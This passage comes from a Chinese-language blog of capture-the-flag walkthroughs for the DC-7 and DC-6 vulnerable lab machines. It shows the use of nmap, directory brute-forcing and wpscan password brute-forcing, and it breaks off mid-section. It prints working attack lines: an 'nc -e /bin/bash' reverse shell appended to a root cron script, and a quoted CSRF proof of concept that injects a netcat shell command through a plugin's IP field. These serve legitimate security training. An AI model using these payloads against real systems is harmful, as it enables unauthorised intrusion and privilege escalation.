alt="img"></p><p>得到如下信息：</p><blockquote><p>-rwxrwxr-x：文件所有者（root）具有rwx读、写、执行权限，文件所在组（www-data）具有rwx读、写、执行权限，其它用户（r-x）只具有读和执行权限。</p><p>1：文件的硬链接计数。对于普通文件，这个数字通常是 1，表示文件只有一个链接</p><p>root：文件所有者user</p><p>www-data：文件所属组group</p><p>520：文件大小，以字节为单位</p><p>Aug 29  2019：文件的最后修改日期</p><p>backups.sh：文件名</p></blockquote><p>简而言之，这个文件的所有者是root，之前我们进行反弹shell的时候，也是反弹所在用户的shell。</p><p>那么利用<code>root：文件所有者user; www-data：文件所属组group</code>这两个信息，在www-data端对脚本文件进行修改，注入反弹shell命令，然后执行，尝试反弹脚本所有者root的权限。</p><p>根据之前在开发者账户收到的邮件信息：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1722093747595.png" alt="img"></p><p>可以发现，数据库备份的操作总是由root执行，那么它记录的相关信息记录也应该是root方的信息，包括脚本文件的位置。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1722093843445.png" alt="img"></p><p>果然。接下来就对脚本文件进行编辑吧。</p><p>使用<code>nano</code>命令修改脚本文件受阻，可能是由于远程连接不稳定的因素造成的。</p><p><code>vim</code>命令也不行，提示<code>command not found</code>，没有这个命令捏</p><p>那就使用<code>echo</code>命令将反弹shell的命令追加到脚本文件中！！！</p><blockquote><p>覆盖写入使用一个<code>&gt;</code></p><p>追加写入使用两个<code>&gt;&gt;</code></p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;nc -e /bin/bash 192.168.204.128 6666&quot;</span> &gt;&gt; backups.sh<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1722094500045.png" alt="img"></p><p>ok！追加成功。码垛，发现反弹回来的是<code>www-data</code>属组的shell。可能因为在执行脚本文件中的命令时，实际上是调用用户的命令权限执行的，也就是说，相当于是<code>www-data</code>属组执行了反弹shell，反弹回来的当然是<code>www-data</code>属组的命令。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1722094610411.png" alt="img"></p><p>别忘了，普通用户也有执行权限，修改文件成功之后，可以让开发者用户去执行这个脚本文件。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1722094858294.png" alt="img"></p><p>可以看到，<code>dc7user</code>处的<code>backups.sh</code>文件内容也跟着修改了。尝试执行！</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1722094992931.png" alt="img"></p><p>坏，也是反弹回<code>dc7user</code>的权限了。<code>dc7user</code>的问题和<code>www-data</code>的一样。</p><p>回顾之前的<code>dc7user</code>收到的邮件内容，发现它的每封邮件都是在04秒发送，而且两封邮件之间规律性地相隔15分钟，感觉像是定时任务。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1722095478559.png" alt="img"></p><blockquote><p>**<code>Cron</code>**：指示这是 <code>cron</code> 服务相关的日志信息。</p><p><code>Cron</code> 是一个 Unix&#x2F;Linux 系统中的任务调度程序，它用于按 预设的时间计划 执行命令或脚本。</p></blockquote><p>果然是定时执行，那既然我们已经成功修改了脚本文件，那就等待root用户的定时任务自动触发脚本吧。</p><p>等待！</p><p>ok ！给我等到了！</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1722096051733.png" alt="img"></p><p>ok！找flag！</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1722096152218.png" alt="img"></p><p>cat！</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1722096165290.png" alt="img"></p><p>ok！成功了。至此，所有任务结束。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li>首先就是这个跳出惯性思维的过程。不仅限于技术攻克，有时候可以通过一些可能不经意被泄露出来的用户信息，通过社会工程攻击，来获取一些重要信息。</li><li><code>echo</code>命令可以对脚本文件（.sh）进行覆写<code>&gt;</code>或追加<code>&gt;&gt;</code></li><li>信息检索是一个比较庞大的工程，需要仔细且不放过任何细节。</li><li>本次提权利用的是<code>root</code>用户设置的<code>Cron</code>定时任务，获得反弹shell的</li><li><code>ls -l</code>查看文件属组和属主信息</li><li>后台管理系统最重要的就是能够获取webshell，拿到站点才有机会进一步提权</li><li>一些脚本文件中可能存在可以利用的地方，比如<code>脚本中的命令</code>。</li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>DC-6</title>
    <link href="/2024/07/30/DC-6/"/>
    <url>/2024/07/30/DC-6/</url>
    
    <content type="html"><![CDATA[<h1 id="DC-6"><a href="#DC-6" class="headerlink" title="DC-6"></a>DC-6</h1><h2 id="IP扫描"><a href="#IP扫描" class="headerlink" title="IP扫描"></a>IP扫描</h2><p>通过开关靶机来确认目标靶机的IP地址：</p><p>开靶机前：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721466473726.png" alt="img"></p><p>开靶机后：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721466588758.png" alt="img"></p><p>可以确认，目标靶机的IP地址为：<code>192.168.204.135</code></p><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><h3 id="nmap和tcp端口扫描"><a href="#nmap和tcp端口扫描" class="headerlink" title="nmap和tcp端口扫描"></a>nmap和tcp端口扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sN -p- 192.168.204.135<br>nmap -sT -p- 192.168.204.135<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721473317554.png" alt="img"></p><p>由端口扫描可以知道，目标靶机开放的端口有：<code>22</code>和<code>80</code>端口，它们分别对应着ssh服务和http服务。</p><p>好！这时候有关getshell的思路就可以有了：hydra爆破远程连接账户、网页信息检索&amp;CMS框架漏洞利用。</p><h3 id="端口详细扫描"><a href="#端口详细扫描" class="headerlink" title="端口详细扫描"></a>端口详细扫描</h3><p>查看更详细的端口信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sT -sV -sC -O -p 22,80 192.168.204.135<br></code></pre></td></tr></table></figure><p>扫描结果如下：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721473643269.png" alt="img"></p><p>其中，显示的有效信息有：</p><blockquote><p>22端口使用的ssh版本为：OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)</p><p>22端口的主机密钥（十六进制表示格式）</p><p>80端口的网页似乎被重定向了：</p><p>Did not follow redirect to <a href="http://wordy/">http://wordy/</a></p><p>并未遵从重定向到<a href="http://wordy/">http://wordy/</a></p></blockquote><p>此时，可以先浅访问一下目标靶机的网站。（192.168.204.135）</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721474020587.png" alt="img"></p><p>果然，网页被重定向了。</p><h2 id="namp漏扫"><a href="#namp漏扫" class="headerlink" title="namp漏扫"></a>namp漏扫</h2><p>为了获取更多的信息，可以再进行namp扫描，看看能不能获得更多有用的信息。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -script=vuln -p 22,80 192.168.204.135<br></code></pre></td></tr></table></figure><p>扫描结果如下：<br><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721474459724.png" alt="img"></p><p>！！！发现了一些<code>wordpress</code>用户名（wordpress是一种CMS框架捏），而且看情况，这些用户名由于用户限制并没有完全显现完。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721474619631.png" alt="img"></p><blockquote><p>admin</p><p>graham</p><p>mark</p><p>sarah</p><p>jens</p></blockquote><p>除此之外，<code>http-enum</code>还提供了与WordPress相关的各种发现：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721474725052.png" alt="img"></p><p>是各种类型的文件：</p><blockquote><p>&#x2F;wp-login.php: Possible admin folder（可能是管理目录）</p><p>&#x2F;readme.html: Wordpress version: 2</p><p>&#x2F;wp-includes&#x2F;images&#x2F;rss.png: Wordpress version 2.2 found.</p><p>&#x2F;wp-includes&#x2F;js&#x2F;jquery&#x2F;suggest.js: Wordpress version 2.5 found.</p><p>&#x2F;wp-includes&#x2F;images&#x2F;blank.gif: Wordpress version 2.6 found.</p><p>&#x2F;wp-includes&#x2F;js&#x2F;comment-reply.js: Wordpress version 2.7 found.</p><p>上述各个文件所使用的Wordpress版本号涉及2、2.2、2.5、2.6、2.7.</p><p>&#x2F;wp-login.php: Wordpress login page.（Wordpress登陆界面）</p><p>&#x2F;wp-admin&#x2F;upgrade.php: Wordpress login page.（Wordpress登陆界面）</p><p>&#x2F;readme.html: Interesting, a readme.（一份说明文件）</p></blockquote><h2 id="重定向修改"><a href="#重定向修改" class="headerlink" title="重定向修改"></a>重定向修改</h2><p>上面进行端口扫描得到的信息显示重定向失败:</p><blockquote><p>Did not follow redirect to <a href="http://wordy/">http://wordy/</a></p><p>并未遵从重定向到<a href="http://wordy/">http://wordy/</a></p></blockquote><p>需要修改本地host文件，这里就在kali内部修改其host文件吧~</p><blockquote><p>打开 <code>etc/hosts</code>文件，添加本地DNS记录 <code>192.168.204.135 wordy</code></p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vim /etc/hosts<br></code></pre></td></tr></table></figure><p>添加完成后保存，退出。重新访问目标靶机的网站。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721475758895.png" alt="img"></p><p>ok！成功正常访问目标靶机网站。</p><h2 id="网页信息检索"><a href="#网页信息检索" class="headerlink" title="网页信息检索"></a>网页信息检索</h2><h3 id="网页模块信息检索"><a href="#网页模块信息检索" class="headerlink" title="网页模块信息检索"></a>网页模块信息检索</h3><p>访问目标网站，其网页主要有三个内容模块：Welcome、About Us、Contact Us。</p><p>在Welcome中，它主要展示了wordy的主要运营产品：是WordPress插件和安全。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721476116046.png" alt="img"></p><p>在About Us中，主要展示了wordy的可信力，人力资源：主要开发者 jens 很厉害，jens 这个名字在前面的nmap漏扫也破获出来了。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721476235722.png" alt="img"></p><p>在Contact Us中，主要就是欢迎的话语，没有任何有用的提示。</p><h3 id="Wapplayzer指纹识别"><a href="#Wapplayzer指纹识别" class="headerlink" title="Wapplayzer指纹识别"></a>Wapplayzer指纹识别</h3><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721476518153.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721480942802.png" alt="img"></p><p>如我们所料，目标网站使用的CMS框架果然是<code>WordPress</code>。到时候可以通过查找有关WordPress的漏洞进行利用。</p><p>为了提高容错率，我们还需要收集更多可能会有用的信息，因而我们可以先进行目录爆破。</p><h2 id="目录爆破"><a href="#目录爆破" class="headerlink" title="目录爆破"></a>目录爆破</h2><h3 id="gobuster爆破"><a href="#gobuster爆破" class="headerlink" title="gobuster爆破"></a>gobuster爆破</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gobuster <span class="hljs-built_in">dir</span> -u http://192.168.204.135 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721481500953.png" alt="img"></p><blockquote><p>获得目录：</p><p><a href="http://192.168.204.135/wp-content/">http://192.168.204.135/wp-content/</a></p><p><a href="http://192.168.204.135/wp-includes/">http://192.168.204.135/wp-includes/</a></p><p><a href="http://192.168.204.135/wp-admin/">http://192.168.204.135/wp-admin/</a></p></blockquote><h3 id="dirsearch爆破"><a href="#dirsearch爆破" class="headerlink" title="dirsearch爆破"></a>dirsearch爆破</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">dirsearch -u  http://192.168.204.135<br>dirsearch -u  http://192.168.204.135 -x 403,404,405,500<br>dirsearch -u  http://192.168.204.135 -x 400-500<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721481597223.png" alt="img"></p><p>不难看出，扫描的目录与响应状态有关，其中也有一些<code>4xx</code>和<code>5xx</code>系列的错误状态码数据包（对我们没啥用处的），所以我们可以在爆破之初，添加<code>-x</code>选项。</p><p><code>-x</code> ：不显示指定的状态码，指定多个通过逗号分隔，或者指定一个范围，两个数之间使用<code>-</code>连接。</p><p><code>2xx</code>：正常的正确响应</p><p><code>3xx</code>：重定向</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721483033212.png" alt="img"></p><blockquote><p>&#x2F;index.php</p><p>&#x2F;license.txt</p><p>&#x2F;readme.html</p><p>&#x2F;wp-admin&#x2F;install.php</p><p>&#x2F;wp-config.php</p><p>&#x2F;wp-content&#x2F;</p><p>&#x2F;wp-includes&#x2F;</p><p>&#x2F;wp-login.php</p><p>&#x2F;wp-cron.php</p><p><a href="http://192.168.204.135/wp-admin/">http://192.168.204.135/wp-admin/</a></p><p><a href="http://wordy/wp-login.php?redirect_to=http://192.168.204.135/wp-admin/&reauth=1">http://wordy/wp-login.php?redirect_to=http%3A%2F%2F192.168.204.135%2Fwp-admin%2F&amp;reauth=1</a></p><p><a href="http://192.168.204.135/wp-content/">http://192.168.204.135/wp-content/</a></p><p><a href="http://192.168.204.135/wp-includes/">http://192.168.204.135/wp-includes/</a></p><p><a href="http://wordy/wp-login.php?action=register">http://wordy/wp-login.php?action=register</a></p></blockquote><h3 id="dirb爆破"><a href="#dirb爆破" class="headerlink" title="dirb爆破"></a>dirb爆破</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">dirb  http://192.168.204.135<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721481976589.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721481920404.png" alt="img"></p><p>虽然其中获得了很多链接，但我们仔细观察，不难发现，IP地址的下级目录分布均在以下三个文件目录之中：</p><blockquote><p><a href="http://192.168.204.135/wp-content/">http://192.168.204.135/wp-content/</a></p><p><a href="http://192.168.204.135/wp-includes/">http://192.168.204.135/wp-includes/</a></p><p><a href="http://192.168.204.135/wp-admin/">http://192.168.204.135/wp-admin/</a></p></blockquote><h3 id="爆破结果"><a href="#爆破结果" class="headerlink" title="爆破结果"></a>爆破结果</h3><p>综合三种爆破方式得到的目录列表，得到目录列表：</p><blockquote><p><a href="http://192.168.204.135/wp-content/">http://192.168.204.135/wp-content/</a></p><p><a href="http://192.168.204.135/wp-includes/">http://192.168.204.135/wp-includes/</a></p><p><a href="http://192.168.204.135/wp-admin/">http://192.168.204.135/wp-admin/</a></p><p><a href="http://wordy/wp-login.php?redirect_to=http://192.168.204.135/wp-admin/&reauth=1">http://wordy/wp-login.php?redirect_to=http%3A%2F%2F192.168.204.135%2Fwp-admin%2F&amp;reauth=1</a></p><p><a href="http://wordy/wp-login.php?action=register">http://wordy/wp-login.php?action=register</a></p><p><a href="http://192.168.204.135/index.php">http://192.168.204.135/index.php</a></p><p><a href="http://192.168.204.135/license.txt">http://192.168.204.135/license.txt</a></p><p><a href="http://192.168.204.135/readme.html">http://192.168.204.135/readme.html</a></p><p><a href="http://192.168.204.135/wp-admin/install.php">http://192.168.204.135/wp-admin/install.php</a></p><p><a href="http://192.168.204.135/wp-config.php">http://192.168.204.135/wp-config.php</a></p><p><a href="http://192.168.204.135/wp-login.php">http://192.168.204.135/wp-login.php</a></p><p><a href="http://192.168.204.135/wp-cron.php">http://192.168.204.135/wp-cron.php</a></p></blockquote><p>尝试逐个登陆，其中有一些网页的响应内容是空的，有些不是。如下面的登陆界面。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721626449346.png" alt="img"></p><h2 id="用户账户爆破"><a href="#用户账户爆破" class="headerlink" title="用户账户爆破"></a>用户账户爆破</h2><p>上面由nmap漏扫得到的可显示的用户名列表为：</p><blockquote><p>admin</p><p>graham</p><p>mark</p><p>sarah</p><p>jens</p></blockquote><p>因为nmap漏扫的得到的提示信息显示，这些用户名并不完全是所有用户，由于权限限制，所以只显现了这么多。</p><p>已知目标靶机使用的是CMS框架WordPress，针对WordPress，有一款对应的黑盒子扫描工具<code>wpscan</code>，可用于爆破用户名以及用户密码。</p><p>尝试使用wpscan爆破用户名，看看是否能够在已有用户名的基础上再多获得几个用户名。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wpscan --url http://wordy/ -e u<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721616222974.png" alt="img"></p><p>好吧，爆破出来的结果并没有获得其它更多的用户名。因此可以先将目前已经拥有的用户名写入一个用户名字典中。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721616704302.png" alt="img"></p><p>用户名字典有了，还需要有个密码字典就可以尝试用户爆破了。</p><p>回顾之前做的有关wordpress框架的密码字典获取，它是根据已有的flag提示使用cewl进行密码字典生成的。</p><p>我们也尝试一下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">cewl http://wordy/ -w CewlDictDC5v1.txt<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721616973120.png" alt="img"></p><p>ok！，尝试使用现在拥有的用户名和密码字典进行用户爆破。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wpscan --url http://wordy/ -U usersDC5.txt -P CewlDictDC5v1.txt<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721617167389.png" alt="img"></p><p>根据提示，所用的密码字典中的例子都无法成功爆破。所以cewl生成的密码字典无效。需要重新寻找爆破字典。</p><p>惹，不推荐使用kali自带的那个爆破字典<code> /usr/share/wordlists/rockyou.txt</code>爆破速度慢得要命。（估计是因为字典太大了？）</p><p>去下载官网vulnhub看看有没有什么提示：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721624077372.png" alt="img"></p><p>ok！开发者们真善良，我们只是想找一份工作而已哈哈哈哈哈。以下是他给我们得操作提示。</p><blockquote><p>cat &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt | grep k01 &gt; passwords.txt</p><p>这段指令的意思是，获取kali默认密码字典的内容并筛选其中包含字符串“k01”的密码，将筛选的结果输出保存到文件passwords.txt中</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /usr/share/wordlists/rockyou.txt | grep k01 &gt; passwordsdc5.txt<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721624369380.png" alt="img"></p><p>操作成功，接下来就是要执行用户账户爆破了。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wpscan --url http://wordy/ -U usersDC5.txt -P passwordsdc5.txt<br></code></pre></td></tr></table></figure><p>ok！成功爆破出一个用户账户。</p><blockquote><p> Username: mark</p><p> Password: helpdesk01</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721624638803.png" alt="img"></p><h2 id="用户登陆-信息获取"><a href="#用户登陆-信息获取" class="headerlink" title="用户登陆&amp;信息获取"></a>用户登陆&amp;信息获取</h2><p>之前我们在进行目录爆破的时候，逐一访问爆破出来的网页的时候，有如下登陆界面，尝试使用上面爆破得到的账户进行登陆。（注意，需要到kali里面操作哦！因为重定向纠正是在kali里面的）</p><p><a href="http://192.168.204.135/wp-login.php">http://192.168.204.135/wp-login.php</a></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721626484402.png" alt="img"></p><p>ok，前面虽然有cookie报错，但是尝试了两边之后，就登陆成功了。而且惊喜的是，登陆成功的是admin管理员后台系统。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721626563699.png" alt="img"></p><p>在模块<code>Users</code>获取了员工信息：用户名、姓名、邮箱、工作角色。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721626854866.png" alt="img"></p><p>还发现了一个<code>Activity monitor</code>模块，活动管理模块（活动监视器），功能类似于日志，监控系统资源的使用：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721627244039.png" alt="img"></p><p>在<code>wordpress</code>框架中，使用到<code>Activity monitor</code>工具可以理解为“插件”。关于该插件的漏洞利用，是存在的哦！</p><h2 id="Get-shell"><a href="#Get-shell" class="headerlink" title="Get shell"></a>Get shell</h2><p>使用<code>searchsploit</code>查找可利用的代码文件。（需要将wordpress和Activity monitor这两个关键词都包含哦！）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">searchsploit WordPress Activity monitor<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721627774276.png" alt="img"></p><p>得到了两条查询结果：</p><blockquote><p>php&#x2F;webapps&#x2F;45274.html</p><p>php&#x2F;webapps&#x2F;50110.py</p></blockquote><p>可以先下载保存一下，看看是什么内容的文件，又或者先使用<code>-P</code>选项查看其详细信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">searchsploit -p 45274.html<br>searchsploit -p 50110.py<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721628066665.png" alt="img"></p><ul><li><strong>先cat查看45274.html文件</strong></li></ul><h3 id="POC反弹shell（傻呗）"><a href="#POC反弹shell（傻呗）" class="headerlink" title="POC反弹shell（傻呗）"></a>POC反弹shell（傻呗）</h3><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721629740248.png" alt="img"></p><p>给出了POC执行代码和提示：</p><blockquote><p>Usage: Replace 127.0.0.1 &amp; 9999 with you ip and port to get reverse shell</p><p>PoC：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;html&gt;<br>&lt;body&gt;<br>&lt;script&gt;history.pushState(<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>)&lt;/script&gt;<br> &lt;form action=<span class="hljs-string">&quot;http://localhost:8000/wp-admin/admin.php?page=plainview_activity_monitor&amp;tab=activity_tools&quot;</span> method=<span class="hljs-string">&quot;POST&quot;</span> enctype=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;<br>   &lt;input <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> name=<span class="hljs-string">&quot;ip&quot;</span> value=<span class="hljs-string">&quot;google.fr| nc -nlvp 127.0.0.1 9999 -e /bin/bash&quot;</span> /&gt;<br>   &lt;input <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> name=<span class="hljs-string">&quot;lookup&quot;</span> value=<span class="hljs-string">&quot;Lookup&quot;</span> /&gt;<br>   &lt;input <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;submit&quot;</span> value=<span class="hljs-string">&quot;Submit request&quot;</span> /&gt;<br> &lt;/form&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure></blockquote><p>仔细查看POC的内容，发现其来源“action”是”<a href="http://localhost:8000/wp-admin/admin.php?page=plainview_activity_monitor&tab=activity_tools%22%E8%BF%99%E4%B8%AA%E7%BD%91%E9%A1%B5%E3%80%82%E5%BE%88%E7%86%9F%E6%82%89%EF%BC%81%E8%B7%9F%E5%A6%82%E4%B8%8B%60Activity">http://localhost:8000/wp-admin/admin.php?page=plainview_activity_monitor&amp;tab=activity_tools&quot;这个网页。很熟悉！跟如下`Activity</a> monitor<code>网页的链接后半部分都一样，而且这里的</code>localhost:8000&#96;应该也是指本地主机和监听端口了。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721632560322.png" alt="img"></p><p>抓包，抓取Referer与上述action值对应的数据包。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721633174618.png" alt="img"></p><p>先发送至重放器，然后右键点击如下：<br><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240722161127082.png" alt="image-20240722161127082"></p><p>将其中的poc内容替换为文件内容。执行“用浏览器测试”。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721633497290.png"></p><p><a href="http://burpsuite/show/6/rx0vjlu75w9ngnsxmajrpopwwkbt0wij">http://burpsuite/show/6/rx0vjlu75w9ngnsxmajrpopwwkbt0wij</a></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721633567708.png" alt="img"></p><p>提交请求”Submit request”，即提交表单。并在这过程中进行抓包。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721633609315.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721633630059.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721633654428.png" alt="img"></p><p>很遗憾，最后好像只是将反弹shell的命令注入到如上的输入框中，后台并没有实际执行这个命令。因为还是没有成功反弹。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721633768955.png" alt="img"></p><p>按道理来说，提交表单之后应该就可以监听到反弹shell了，至于这里为什么失败了，看看是否是反弹时长比较长？之后再进行尝试吧。</p><ul><li><strong>查看50110.py文件</strong></li></ul><h3 id="漏洞脚本（-py）Getshell"><a href="#漏洞脚本（-py）Getshell" class="headerlink" title="漏洞脚本（.py）Getshell"></a>漏洞脚本（.py）Getshell</h3><p>这应该是个脚本文件，先看看它的具体代码内容吧。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721636490651.png" alt="img"></p><p>直接就有使用方法了！直接使用python3命令执行漏洞利用脚本。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 /usr/share/exploitdb/exploits/php/webapps/50110.py<br></code></pre></td></tr></table></figure><p>输入目标靶机的IP地址、已获得用户名、用户密码。</p><p> 码垛！直接成功了。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721637189750.png" alt="img"></p><p>接下来，可以先查找一下有没有flag文件。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -name *flag*<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721637413521.png" alt="img"></p><p>查出来的结果挺少。也没有我们要找的flag文本文件。</p><p>所以，我们只好考虑提权了！</p><p>有关于Getshell的方法，还有一个利用网页组件漏洞的！</p><h3 id="网页组件漏洞Getshell"><a href="#网页组件漏洞Getshell" class="headerlink" title="网页组件漏洞Getshell"></a>网页组件漏洞Getshell</h3><p>首先，我们在进行网页检索的时候，在<code>Activity monitor</code>发现了一个可能的注入点<code>IP or integer *</code>。然后下方还有两个按钮控件，看着像是提交<code>IP or integer *</code>的按钮。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721637749847.png" 